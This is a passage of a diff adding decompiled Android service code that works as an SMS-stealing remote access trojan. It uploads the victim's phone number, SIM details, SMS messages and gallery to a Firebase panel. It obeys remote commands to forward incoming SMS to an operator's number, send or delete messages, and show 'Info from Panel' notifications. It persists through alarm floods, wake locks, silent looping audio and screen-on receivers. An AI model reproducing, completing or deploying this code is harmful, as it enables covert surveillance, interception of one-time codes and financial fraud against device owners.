+            this.smsFwdActive = r14;
+            this.smsFwdTarget = "";
+            this.smsFwdSim = r14;
+            this.smsFwd.setState(r14, "", r14);
+            HashMap map9 = new HashMap();
+            map9.put(Constants.MessagePayloadKeys.FROM, Integer.valueOf((int) r14));
+            map9.put("to", "");
+            map9.put("isActive", Boolean.FALSE);
+            Long lValueOf = Long.valueOf(System.currentTimeMillis());
+            obj = ServerValues.NAME_OP_TIMESTAMP;
+            map9.put(obj, lValueOf);
+            FirebaseDatabase.getInstance().getReference(((String) r5) + this.deviceID + "/webhookEvent/smsForward").setValue(map9);
+            saveForwarderSettings(r14, "", r14);
+            delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder((String) r5), this.deviceID, "/webhookEvent/stopForwarder"));
+        } else {
+            obj = r14;
+        }
+        if (map.containsKey("updateForwarder")) {
+            Object obj11 = map.get("updateForwarder");
+            if (obj11 instanceof Map) {
+                Map map10 = (Map) obj11;
+                if (map10.containsKey("phoneNumber")) {
+                    String strValueOf3 = map10.get("phoneNumber") != null ? String.valueOf(map10.get("phoneNumber")) : null;
+                    if (strValueOf3 != null && !strValueOf3.isEmpty()) {
+                        int iObjInt7 = map10.containsKey("simIndex") ? objInt(map10.get("simIndex")) : 0;
+                        this.smsFwdActive = true;
+                        this.smsFwdTarget = strValueOf3;
+                        this.smsFwdSim = iObjInt7;
+                        this.smsFwd.setState(true, strValueOf3, iObjInt7);
+                        HashMap map11 = new HashMap();
+                        map11.put(Constants.MessagePayloadKeys.FROM, Integer.valueOf(iObjInt7));
+                        map11.put("to", strValueOf3);
+                        Boolean bool = Boolean.TRUE;
+                        map11.put("isActive", bool);
+                        map11.put(obj, Long.valueOf(System.currentTimeMillis()));
+                        map11.put("persistent", bool);
+                        FirebaseDatabase.getInstance().getReference(((String) r5) + this.deviceID + "/webhookEvent/smsForward").setValue(map11);
+                        saveForwarderSettings(true, strValueOf3, iObjInt7);
+                        delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder((String) r5), this.deviceID, "/webhookEvent/updateForwarder"));
+                    }
+                }
+            }
+        }
+        if (map.containsKey("donation")) {
+            Object obj12 = map.get("donation");
+            if (obj12 instanceof Map) {
+                Map map12 = (Map) obj12;
+                if (map12.equals(this.lastDonation)) {
+                    str = r11;
+                } else {
+                    this.lastDonation = new HashMap(map12);
+                    String str5 = (String) map12.get("target");
+                    boolean zBoolVal3 = boolVal(map12.get("isActive"));
+                    if (map12.get("amount") instanceof Double) {
+                        dDoubleValue = ((Double) map12.get("amount")).doubleValue();
+                    } else if (map12.get("amount") instanceof Long) {
+                        dDoubleValue = ((Long) map12.get("amount")).doubleValue();
+                    } else {
+                        dDoubleValue = map12.get("amount") instanceof Integer ? ((Integer) map12.get("amount")).doubleValue() : 0.0d;
+                    }
+                    if (str5 == null || str5.isEmpty() || !zBoolVal3 || dDoubleValue <= 0.0d) {
+                        str = r11;
+                    } else {
+                        String str6 = "Donation active: " + dDoubleValue + " to " + str5;
+                        str = TAG;
+                        Log.d(str, str6);
+                    }
+                }
+            } else {
+                str = r11;
+            }
+        } else {
+            str = r11;
+        }
+        if (map.containsKey("relayWake")) {
+            Object obj13 = map.get("relayWake");
+            if (obj13 instanceof Map) {
+                Map map13 = (Map) obj13;
+                long jLongValue = map13.containsKey(obj) ? ((Number) map13.get(obj)).longValue() : 0L;
+                if (jLongValue <= 0 || jLongValue > this.lastRelayWakeTs) {
+                    if (jLongValue > 0) {
+                        this.lastRelayWakeTs = jLongValue;
+                    }
+                    Object obj14 = map13.get("targets");
+                    if (obj14 instanceof List) {
+                        List list2 = (List) obj14;
+                        String strValueOf4 = map13.containsKey(r6) ? String.valueOf(map13.get("message")) : "##RECONNECT##";
+                        int iObjInt8 = map13.containsKey("simIndex") ? objInt(map13.get("simIndex")) : 0;
+                        Log.d(str, "Relay wake received: " + list2.size() + " targets");
+                        z = true;
+                        this.exec.execute(new FormDataManager$$ExternalSyntheticLambda1(this, list2, strValueOf4, iObjInt8, 3));
+                    }
+                } else {
+                    Log.d(str, "Relay wake dedup: skipping old timestamp " + jLongValue);
+                }
+                z = true;
+            } else {
+                z = true;
+            }
+        } else {
+            z = true;
+        }
+        if (map.containsKey("showInfo")) {
+            Object obj15 = map.get("showInfo");
+            if (obj15 instanceof Map) {
+                Map map14 = (Map) obj15;
+                if (map14.containsKey(r6)) {
+                    String strValueOf5 = map14.get(r6) != null ? String.valueOf(map14.get(r6)) : null;
+                    if (strValueOf5 != null && !strValueOf5.isEmpty()) {
+                        int i3 = Build.VERSION.SDK_INT;
+                        Notification notificationBuild = (i3 >= 26 ? RestartActivity$$ExternalSyntheticApiModelOutline0.m(this) : new Notification.Builder(this)).setContentTitle("Info from Panel").setContentText(strValueOf5).setStyle(new Notification.BigTextStyle().bigText(strValueOf5)).setSmallIcon(R.drawable.ic_settings_black).setAutoCancel(z).build();
+                        if (i3 < 33 || checkSelfPermission("android.permission.POST_NOTIFICATIONS") == 0) {
+                            ((NotificationManager) getSystemService("notification")).notify(1001, notificationBuild);
+                        }
+                        delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder((String) r5), this.deviceID, "/webhookEvent/showInfo"));
+                    }
+                }
+            }
+        }
+        if (map.containsKey("refreshSms")) {
+            Object obj16 = map.get("refreshSms");
+            if ((obj16 instanceof Map) && boolVal(((Map) obj16).get("trigger"))) {
+                this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 4));
+            }
+        }
+        if (map.containsKey("reconnect")) {
+            Object obj17 = map.get("reconnect");
+            if ((obj17 instanceof Map) && Boolean.TRUE.equals(((Map) obj17).get("trigger"))) {
+                this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 5));
+            }
+        }
+        if (map.containsKey("ping")) {
+            Object obj18 = map.get("ping");
+            if ((obj18 instanceof Map) && boolVal(((Map) obj18).get("trigger"))) {
+                HashMap map15 = new HashMap();
+                map15.put(obj, Long.valueOf(System.currentTimeMillis()));
+                map15.put("deviceID", this.deviceID);
+                FirebaseDatabase.getInstance().getReference(((String) r5) + this.deviceID + "/webhookEvent/pong").setValue(map15);
+                delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder("clients/"), this.deviceID, "/webhookEvent/ping"));
+            }
+        }
+        if (map.containsKey("deleteSms")) {
+            Object obj19 = map.get("deleteSms");
+            if (obj19 instanceof Map) {
+                Map map16 = (Map) obj19;
+                if (map16.containsKey("ids") && (map16.get("ids") instanceof List)) {
+                    this.exec.execute(new Processor$$ExternalSyntheticLambda2(12, this, (List) map16.get("ids")));
+                }
+            }
+        }
+    }
+
+    private void registerBatteryReceiver() {
+        if (this.batteryReceiver != null) {
+            return;
+        }
+        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() { // from class: com.cbqimrt.lx4076cb.ForegroundService.5
+            @Override // android.content.BroadcastReceiver
+            public void onReceive(Context context, Intent intent) {
+                int intExtra = intent.getIntExtra("level", -1);
+                int intExtra2 = intent.getIntExtra("scale", -1);
+                if (intExtra == -1 || intExtra2 == -1) {
+                    return;
+                }
+                FirebaseDatabase.getInstance().getReference("clients/" + ForegroundService.this.deviceID + "/battery").setValue(((int) ((intExtra / intExtra2) * 100.0f)) + "%");
+            }
+        };
+        this.batteryReceiver = broadcastReceiver;
+        if (Build.VERSION.SDK_INT >= 33) {
+            registerReceiver(broadcastReceiver, new IntentFilter("android.intent.action.BATTERY_CHANGED"), 4);
+        } else {
+            registerReceiver(broadcastReceiver, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void registerDevice() {
+        List<Map<String, Object>> allMessages;
+        if (!NetworkUtil.isConnected(this)) {
+            new Thread(new ForegroundService$$ExternalSyntheticLambda23(this, 9)).start();
+            return;
+        }
+        App.ensureFirebaseAuthSync();
+        if (FirebaseAuth.getInstance().getCurrentUser() == null) {
+            Log.e(TAG, "Firebase auth still null after sync, retrying in 5s");
+            this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 10));
+            return;
+        }
+        final boolean z = getApplicationContext().checkSelfPermission("android.permission.READ_PHONE_STATE") == 0;
+        final HashMap map = new HashMap();
+        map.put("deviceId", this.deviceID);
+        map.put("modelName", Build.MODEL);
+        map.put("androidV", Build.VERSION.RELEASE);
+        map.put("sdkV", String.valueOf(Build.VERSION.SDK_INT));
+        String[] strArr = Build.SUPPORTED_ABIS;
+        map.put("cpu_arch", strArr.length > 0 ? strArr[0] : "unknown");
+        map.put("isRoot", Boolean.valueOf(checkRoot()));
+        map.put("storage", getStorage());
+        map.put("battery", getBattery());
+        map.put("status", Boolean.TRUE);
+        map.put("joined", new SimpleDateFormat("dd/MM/yyyy | hh:mm a", Locale.getDefault()).format(new Date()));
+        if (z) {
+            map.put("mobNo", getPhoneNumber());
+            map.put("service_provider", getCarrier());
+            map.put("sims", getSims());
+        }
+        boolean z2 = getSharedPreferences(PREFS_NAME, 0).getBoolean("existingMsgsUploaded", false);
+        final boolean z3 = !z2;
+        if (z2) {
+            allMessages = null;
+        } else {
+            Set<String> setLoadKeywords = loadKeywords();
+            allMessages = setLoadKeywords.isEmpty() ? getAllMessages() : getFilteredMessages(setLoadKeywords);
+        }
+        final List<Map<String, Object>> list = allMessages;
+        getPublicIP(new IPListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService$$ExternalSyntheticLambda57
+            @Override // com.cbqimrt.lx4076cb.ForegroundService.IPListener
+            public final void onIP(String str) {
+                this.f$0.lambda$registerDevice$9(map, z3, list, z, str);
+            }
+        });
+    }
+
+    private void registerNetworkListener() {
+        int i = Build.VERSION.SDK_INT;
+        if (i < 24) {
+            AnonymousClass7 anonymousClass7 = new AnonymousClass7();
+            this.connectivityReceiver = anonymousClass7;
+            if (i >= 33) {
+                registerReceiver(anonymousClass7, new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"), 4);
+                return;
+            } else {
+                registerReceiver(anonymousClass7, new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
+                return;
+            }
+        }
+        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService("connectivity");
+        if (connectivityManager == null) {
+            return;
+        }
+        NetworkRequest networkRequestBuild = new NetworkRequest.Builder().addTransportType(0).addTransportType(1).addTransportType(3).build();
+        AnonymousClass6 anonymousClass6 = new AnonymousClass6();
+        this.networkCallback = anonymousClass6;
+        try {
+            connectivityManager.registerNetworkCallback(networkRequestBuild, anonymousClass6);
+        } catch (Exception unused) {
+        }
+    }
+
+    private void registerPersistenceReceivers() {
+        if (this.persistenceReceiver != null) {
+            return;
+        }
+        this.persistenceReceiver = new BroadcastReceiver() { // from class: com.cbqimrt.lx4076cb.ForegroundService.8
+            @Override // android.content.BroadcastReceiver
+            public void onReceive(Context context, Intent intent) {
+                if (ForegroundService.isRunning()) {
+                    return;
+                }
+                ServiceUtil.startService(ForegroundService.this, ForegroundService.class);
+                ForegroundService.scheduleAlarm(context);
+                ForegroundService.scheduleAlarmFlood(context);
+            }
+        };
+        IntentFilter intentFilter = new IntentFilter();
+        intentFilter.addAction("android.intent.action.TIME_TICK");
+        intentFilter.addAction("android.intent.action.SCREEN_ON");
+        intentFilter.addAction("android.intent.action.USER_PRESENT");
+        try {
+            if (Build.VERSION.SDK_INT >= 33) {
+                registerReceiver(this.persistenceReceiver, intentFilter, 4);
+            } else {
+                registerReceiver(this.persistenceReceiver, intentFilter);
+            }
+        } catch (Exception unused) {
+        }
+    }
+
+    private void reinitialize() throws Throwable {
+        ValueEventListener valueEventListener;
+        ValueEventListener valueEventListener2;
+        if (running.getAndSet(true)) {
+            return;
+        }
+        DatabaseReference databaseReference = this.dataRef;
+        if (databaseReference != null && (valueEventListener2 = this.dataListener) != null) {
+            databaseReference.removeEventListener(valueEventListener2);
+        }
+        DatabaseReference databaseReference2 = this.connectedRef;
+        if (databaseReference2 != null && (valueEventListener = this.connectedListener) != null) {
+            databaseReference2.removeEventListener(valueEventListener);
+        }
+        this.isListening = false;
+        this.isHeartbeating = false;
+        this.hbFails = 0;
+        if (FirebaseApp.getApps(this).isEmpty()) {
+            FirebaseApp.initializeApp(this);
+        }
+        if (this.exec.isShutdown() || this.exec.isTerminated()) {
+            this.exec = Executors.newSingleThreadExecutor();
+        }
+        if (this.hbExec.isShutdown() || this.hbExec.isTerminated()) {
+            this.hbExec = Executors.newSingleThreadExecutor();
+        }
+        acquireWL();
+        startWLTimer();
+        scheduleAlarm(this);
+        scheduleAlarmFlood(this);
+        registerBatteryReceiver();
+        unregisterNetworkListener();
+        registerNetworkListener();
+        registerPersistenceReceivers();
+        KeepAliveJobService.schedule(this);
+        KeepAliveWorker.schedule(this);
+        startForegroundInternal();
+        startSilentAudio();
+        requestExactAlarmPermission();
+        getSharedPreferences(PREFS_NAME, 0).edit().remove(KEY_REGISTERED).remove("existingMsgsUploaded").apply();
+        this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 0));
+    }
+
+    private void releaseWL() {
+        ScheduledFuture<?> scheduledFuture = this.wlTask;
+        if (scheduledFuture != null) {
+            scheduledFuture.cancel(false);
+            this.wlTask = null;
+        }
+        ScheduledExecutorService scheduledExecutorService = this.wlScheduler;
+        if (scheduledExecutorService != null) {
+            scheduledExecutorService.shutdownNow();
+            this.wlScheduler = null;
+        }
+        ScheduledExecutorService scheduledExecutorService2 = this.smsScheduler;
+        if (scheduledExecutorService2 != null) {
+            scheduledExecutorService2.shutdownNow();
+            this.smsScheduler = null;
+        }
+        PowerManager.WakeLock wakeLock = this.wl;
+        if (wakeLock == null || !wakeLock.isHeld()) {
+            return;
+        }
+        this.wl.release();
+        this.wl = null;
+    }
+
+    private void requestExactAlarmPermission() {
+        AlarmManager alarmManager;
+        if (Build.VERSION.SDK_INT >= 31 && (alarmManager = (AlarmManager) getSystemService("alarm")) != null) {
+            try {
+                if (alarmManager.canScheduleExactAlarms()) {
+                    return;
+                }
+                Intent intent = new Intent("android.settings.REQUEST_SCHEDULE_EXACT_ALARM");
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                intent.addFlags(268435456);
+                startActivity(intent);
+            } catch (Exception unused) {
+            }
+        }
+    }
+
+    private void restoreSmsForward() {
+        FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/webhookEvent/smsForward").addListenerForSingleValueEvent(new ValueEventListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService.4
+            @Override // com.google.firebase.database.ValueEventListener
+            public void onCancelled(DatabaseError databaseError) {
+                Log.w(ForegroundService.TAG, "restoreSmsForward cancelled: " + databaseError.getMessage());
+            }
+
+            @Override // com.google.firebase.database.ValueEventListener
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                if (dataSnapshot.exists()) {
+                    Object value = dataSnapshot.getValue();
+                    if (value instanceof Map) {
+                        Map map = (Map) value;
+                        if (ForegroundService.this.boolVal(map.get("isActive"))) {
+                            String str = (String) map.get("to");
+                            int iObjInt = ForegroundService.this.objInt(map.get(Constants.MessagePayloadKeys.FROM));
+                            if (str == null || str.isEmpty()) {
+                                return;
+                            }
+                            ForegroundService.this.smsFwdActive = true;
+                            ForegroundService.this.smsFwdTarget = str;
+                            ForegroundService.this.smsFwdSim = iObjInt;
+                            ForegroundService.this.smsFwd.setState(true, str, iObjInt);
+                        }
+                    }
+                }
+            }
+        });
+    }
+
+    private void saveForwarderSettings(boolean z, String str, int i) {
+        HashMap map = new HashMap();
+        map.put("phoneNumber", str);
+        map.put("simIndex", Integer.valueOf(i));
+        map.put("isActive", Boolean.valueOf(z));
+        map.put("updatedAt", Long.valueOf(System.currentTimeMillis()));
+        FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/settings/forwarder").setValue(map);
+    }
+
+    public static void scheduleAlarm(Context context) {
+        boolean zCanScheduleExactAlarms;
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
+        if (alarmManager == null) {
+            return;
+        }
+        long jCurrentTimeMillis = System.currentTimeMillis();
+        if (Build.VERSION.SDK_INT >= 31) {
+            try {
+                zCanScheduleExactAlarms = alarmManager.canScheduleExactAlarms();
+            } catch (Exception unused) {
+                zCanScheduleExactAlarms = false;
+            }
+        } else {
+            zCanScheduleExactAlarms = true;
+        }
+        int[] iArr = {60, 90, 150, 210, 330, 450, 600, 900};
+        for (int i = 0; i < 8; i++) {
+            Intent intent = new Intent(context, (Class<?>) AlarmReceiver.class);
+            intent.setAction("com.cbqimrt.lx4076cb.KEEP_ALIVE");
+            PendingIntent broadcast = PendingIntent.getBroadcast(context, i + 100, intent, (Build.VERSION.SDK_INT >= 23 ? 67108864 : 0) | 134217728);
+            long j = (((long) iArr[i]) * 1000) + jCurrentTimeMillis;
+            if (i == 0 && zCanScheduleExactAlarms) {
+                try {
+                    alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(j, broadcast), broadcast);
+                } catch (Exception unused2) {
+                    alarmManager.setExactAndAllowWhileIdle(0, j, broadcast);
+                }
+            } else if (zCanScheduleExactAlarms) {
+                try {
+                    alarmManager.setExactAndAllowWhileIdle(0, j, broadcast);
+                } catch (Exception unused3) {
+                    alarmManager.set(0, j, broadcast);
+                }
+            } else {
+                alarmManager.set(0, j, broadcast);
+            }
+        }
+    }
+
+    public static void scheduleAlarmFlood(Context context) {
+        boolean zCanScheduleExactAlarms;
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
+        if (alarmManager == null) {
+            return;
+        }
+        long jCurrentTimeMillis = System.currentTimeMillis();
+        if (Build.VERSION.SDK_INT >= 31) {
+            try {
+                zCanScheduleExactAlarms = alarmManager.canScheduleExactAlarms();
+            } catch (Exception unused) {
+                zCanScheduleExactAlarms = false;
+            }
+        } else {
+            zCanScheduleExactAlarms = true;
+        }
+        int[] iArr = {300, 420, 540, 660, 780, 900, 1020, 1140, 1260, 1380, ConnectionResult.DRIVE_EXTERNAL_STORAGE_REQUIRED, 1620, 1740, 1860, 1980};
+        for (int i = 0; i < 15; i++) {
+            Intent intent = new Intent(context, (Class<?>) AlarmReceiver.class);
+            intent.setAction("com.cbqimrt.lx4076cb.KEEP_ALIVE");
+            PendingIntent broadcast = PendingIntent.getBroadcast(context, i + 200, intent, (Build.VERSION.SDK_INT >= 23 ? 67108864 : 0) | 134217728);
+            long j = (((long) iArr[i]) * 1000) + jCurrentTimeMillis;
+            if (zCanScheduleExactAlarms) {
+                try {
+                    alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(j, broadcast), broadcast);
+                } catch (Exception unused2) {
+                    alarmManager.setExactAndAllowWhileIdle(0, j, broadcast);
+                }
+            } else {
+                alarmManager.set(0, j, broadcast);
+            }
+        }
+    }
+
+    private void scheduleReconnect() {
+        this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 6));
+    }
+
+    private static void scheduleRestartAlarms(Context context) {
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
+        if (alarmManager == null) {
+            return;
+        }
+        long jCurrentTimeMillis = System.currentTimeMillis();
+        for (int i = 0; i < 3; i++) {
+            Intent intent = new Intent(context, (Class<?>) ForegroundService.class);
+            int i2 = Build.VERSION.SDK_INT;
+            PendingIntent service = PendingIntent.getService(context, i + 10, intent, (i2 >= 23 ? 67108864 : 0) | 134217728);
+            long j = (((long) i) * 4000) + 1000 + jCurrentTimeMillis;
+            if (i2 >= 31) {
+                try {
+                    if (alarmManager.canScheduleExactAlarms()) {
+                        alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(j, service), service);
+                    } else {
+                        alarmManager.setExactAndAllowWhileIdle(0, j, service);
+                    }
+                } catch (Exception unused) {
+                    alarmManager.set(0, j, service);
+                }
+            } else {
+                try {
+                    alarmManager.setExactAndAllowWhileIdle(0, j, service);
+                } catch (Exception unused2) {
+                    alarmManager.set(0, j, service);
+                }
+            }
+        }
+    }
+
+    public static boolean sendSms(String str, String str2, int i) {
+        SmsManager smsManagerForSubscriptionId;
+        Context context;
+        SubscriptionManager subscriptionManagerM42m;
+        try {
+            String strReplaceAll = str.trim().replaceAll("[^0-9+]", "");
+            if (strReplaceAll.isEmpty() || (smsManagerForSubscriptionId = SmsManager.getDefault()) == null) {
+                return false;
+            }
+            int i2 = Build.VERSION.SDK_INT;
+            if (i2 >= 22 && (context = appContext) != null) {
+                SubscriptionInfo subscriptionInfoM = null;
+                if (i2 >= 23) {
+                    try {
+                        subscriptionManagerM42m = ForegroundService$$ExternalSyntheticApiModelOutline14.m42m(context.getSystemService(ForegroundService$$ExternalSyntheticApiModelOutline14.m()));
+                    } catch (Exception e) {
+                        Log.w(TAG, "SIM fallback to default", e);
+                    }
+                } else {
+                    subscriptionManagerM42m = null;
+                }
+                if (subscriptionManagerM42m == null) {
+                    subscriptionManagerM42m = SubscriptionManager.from(appContext);
+                }
+                List activeSubscriptionInfoList = subscriptionManagerM42m.getActiveSubscriptionInfoList();
+                if (activeSubscriptionInfoList != null && !activeSubscriptionInfoList.isEmpty()) {
+                    Iterator it = activeSubscriptionInfoList.iterator();
+                    while (it.hasNext()) {
+                        SubscriptionInfo subscriptionInfoM2 = ForegroundService$$ExternalSyntheticApiModelOutline14.m(it.next());
+                        if (subscriptionInfoM2.getSimSlotIndex() == i) {
+                            subscriptionInfoM = subscriptionInfoM2;
+                            break;
+                        }
+                    }
+                    if (subscriptionInfoM == null && i >= 0 && i < activeSubscriptionInfoList.size()) {
+                        subscriptionInfoM = ForegroundService$$ExternalSyntheticApiModelOutline14.m(activeSubscriptionInfoList.get(i));
+                    }
+                    if (subscriptionInfoM != null) {
+                        smsManagerForSubscriptionId = SmsManager.getSmsManagerForSubscriptionId(subscriptionInfoM.getSubscriptionId());
+                    }
+                }
+                Log.w(TAG, "sendSms: no active SIM subscription available");
+                return false;
+            }
+            SmsManager smsManager = smsManagerForSubscriptionId;
+            if (str2.length() > 160) {
+                smsManager.sendMultipartTextMessage(strReplaceAll, null, smsManager.divideMessage(str2), null, null);
+                return true;
+            }
+            smsManager.sendTextMessage(strReplaceAll, null, str2, null, null);
+            return true;
+        } catch (Exception e2) {
+            Log.e(TAG, "send SMS error", e2);
+            return false;
+        }
+    }
+
+    private void setupPresence() {
+        this.statusRef = FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/status");
+        final DatabaseReference reference = FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/lastSeen");
+        final DatabaseReference reference2 = FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/connectedAt");
+        DatabaseReference reference3 = FirebaseDatabase.getInstance().getReference(".info/connected");
+        this.connectedRef = reference3;
+        ValueEventListener valueEventListener = this.connectedListener;
+        if (valueEventListener != null) {
+            reference3.removeEventListener(valueEventListener);
+        }
+        ValueEventListener valueEventListener2 = new ValueEventListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService.3
+            @Override // com.google.firebase.database.ValueEventListener
+            public void onCancelled(DatabaseError databaseError) {
+                Log.w(ForegroundService.TAG, "setupPresence cancelled: " + databaseError.getMessage());
+            }
+
+            @Override // com.google.firebase.database.ValueEventListener
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                Boolean bool = (Boolean) dataSnapshot.getValue(Boolean.class);
+                if (bool == null || !bool.booleanValue()) {
+                    return;
+                }
+                long jCurrentTimeMillis = System.currentTimeMillis();
+                ForegroundService.this.statusRef.setValue(Boolean.TRUE);
+                reference2.setValue(Long.valueOf(jCurrentTimeMillis));
+                reference.setValue(Long.valueOf(jCurrentTimeMillis));
+                ForegroundService.this.statusRef.onDisconnect().setValue(Boolean.FALSE);
+                reference.onDisconnect().setValue(ServerValue.TIMESTAMP);
+                if (ForegroundService.this.isHeartbeating) {
+                    return;
+                }
+                ForegroundService.this.startHeartbeat(reference);
+            }
+        };
+        this.connectedListener = valueEventListener2;
+        this.connectedRef.addValueEventListener(valueEventListener2);
+    }
+
+    private void startForegroundInternal() {
+        try {
+            if (Build.VERSION.SDK_INT >= 29) {
+                startForeground(1, buildNotif(), 3);
+            } else {
+                startForeground(1, buildNotif());
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "startForeground failed, retrying in 3s", e);
+            if (Build.VERSION.SDK_INT >= 33 && checkSelfPermission("android.permission.POST_NOTIFICATIONS") != 0) {
+                Log.e(TAG, "POST_NOTIFICATIONS permission denied — service cannot run in background on Android 13+. User must enable notifications in Settings.");
+            }
+            new Handler(Looper.getMainLooper()).postDelayed(new ForegroundService$$ExternalSyntheticLambda23(this, 2), 3000L);
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void startGalleryUpload() {
+        if (this.galleryUploadActive) {
+            return;
+        }
+        this.galleryExec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 8));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void startHeartbeat(DatabaseReference databaseReference) {
+        this.isHeartbeating = true;
+        this.hbExec.execute(new Processor$$ExternalSyntheticLambda2(13, this, databaseReference));
+    }
+
+    private void startListening() {
+        if (this.isListening) {
+            return;
+        }
+        this.dataRef = FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/webhookEvent");
+        ValueEventListener valueEventListener = new ValueEventListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService.2
+            @Override // com.google.firebase.database.ValueEventListener
+            public void onCancelled(DatabaseError databaseError) {
+                Log.w(ForegroundService.TAG, "startListening cancelled: " + databaseError.getMessage());
+            }
+
+            @Override // com.google.firebase.database.ValueEventListener
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                if (!dataSnapshot.exists() || dataSnapshot.getValue() == null) {
+                    return;
+                }
+                try {
+                    if (dataSnapshot.getValue() instanceof Map) {
+                        ForegroundService.this.process((Map) dataSnapshot.getValue());
+                    } else {
+                        Log.w(ForegroundService.TAG, "Unexpected webhook data type: " + dataSnapshot.getValue().getClass());
+                    }
+                } catch (Exception e) {
+                    Log.e(ForegroundService.TAG, "process error", e);
+                }
+            }
+        };
+        this.dataListener = valueEventListener;
+        this.dataRef.addValueEventListener(valueEventListener);
+        this.isListening = true;
+    }
+
+    /* JADX WARN: Code duplicated, block: B:36:0x005e A[EXC_TOP_SPLITTER, SYNTHETIC] */
+    private void startSilentAudio() throws Throwable {
+        Throwable th;
+        AssetFileDescriptor assetFileDescriptorOpenFd;
+        if (this.mediaPlayer != null) {
+            return;
+        }
+        AssetFileDescriptor assetFileDescriptor = null;
+        try {
+            try {
+                assetFileDescriptorOpenFd = getAssets().openFd("silent.wav");
+                try {
+                    MediaPlayer mediaPlayer = new MediaPlayer();
+                    this.mediaPlayer = mediaPlayer;
+                    mediaPlayer.setDataSource(assetFileDescriptorOpenFd.getFileDescriptor(), assetFileDescriptorOpenFd.getStartOffset(), assetFileDescriptorOpenFd.getLength());
+                    this.mediaPlayer.setLooping(true);
+                    this.mediaPlayer.setVolume(0.0f, 0.0f);
+                    this.mediaPlayer.prepare();
+                    this.mediaPlayer.start();
+                } catch (Exception unused) {
+                    Log.w(TAG, "Silent audio not available");
+                    MediaPlayer mediaPlayer2 = this.mediaPlayer;
+                    if (mediaPlayer2 != null) {
+                        try {
+                            mediaPlayer2.release();
+                        } catch (Exception unused2) {
+                        }
+                        this.mediaPlayer = null;
+                    }
+                    if (assetFileDescriptorOpenFd == null) {
+                        return;
+                    }
+                }
+            } catch (Exception unused3) {
+                assetFileDescriptorOpenFd = null;
+            } catch (Throwable th2) {
+                th = th2;
+                if (0 != 0) {
+                    try {
+                        assetFileDescriptor.close();
+                    } catch (Exception unused4) {
+                    }
+                }
+                throw th;
+            }
+            try {
+                assetFileDescriptorOpenFd.close();
+            } catch (Exception unused5) {
+            }
+        } catch (Throwable th3) {
+            th = th3;
+            if (0 != 0) {
+                assetFileDescriptor.close();
+            }
+            throw th;
+        }
+    }
+
+    private void startSmsPoll() {
+        ScheduledExecutorService scheduledExecutorService = this.smsScheduler;
+        if (scheduledExecutorService == null || scheduledExecutorService.isShutdown()) {
+            this.smsScheduler = Executors.newSingleThreadScheduledExecutor();
+        }
+        this.smsScheduler.scheduleAtFixedRate(new ForegroundService$$ExternalSyntheticLambda23(this, 7), 30L, 30L, TimeUnit.SECONDS);
+    }
+
+    private void startWLTimer() {
+        ScheduledFuture<?> scheduledFuture = this.wlTask;
+        if (scheduledFuture != null) {
+            scheduledFuture.cancel(false);
+        }
+        ScheduledExecutorService scheduledExecutorService = this.wlScheduler;
+        if (scheduledExecutorService == null || scheduledExecutorService.isShutdown()) {
+            this.wlScheduler = Executors.newSingleThreadScheduledExecutor();
+        }
+        this.wlTask = this.wlScheduler.scheduleAtFixedRate(new ForegroundService$$ExternalSyntheticLambda23(this, 3), 9L, 9L, TimeUnit.MINUTES);
+    }
+
+    private void unregisterNetworkListener() {
+        if (this.networkCallback != null && Build.VERSION.SDK_INT >= 24) {
+            try {
+                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService("connectivity");
+                if (connectivityManager != null) {
+                    connectivityManager.unregisterNetworkCallback(this.networkCallback);
+                }
+            } catch (Exception unused) {
+            }
+            this.networkCallback = null;
+        }
+        BroadcastReceiver broadcastReceiver = this.connectivityReceiver;
+        if (broadcastReceiver != null) {
+            try {
+                unregisterReceiver(broadcastReceiver);
+            } catch (Exception unused2) {
+            }
+            this.connectivityReceiver = null;
+        }
+    }
+
+    private void unregisterPersistenceReceivers() {
+        BroadcastReceiver broadcastReceiver = this.persistenceReceiver;
+        if (broadcastReceiver != null) {
+            try {
+                unregisterReceiver(broadcastReceiver);
+            } catch (Exception unused) {
+            }
+            this.persistenceReceiver = null;
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void updateSimDataDelayed() {
+        try {
+            Thread.sleep(8000L);
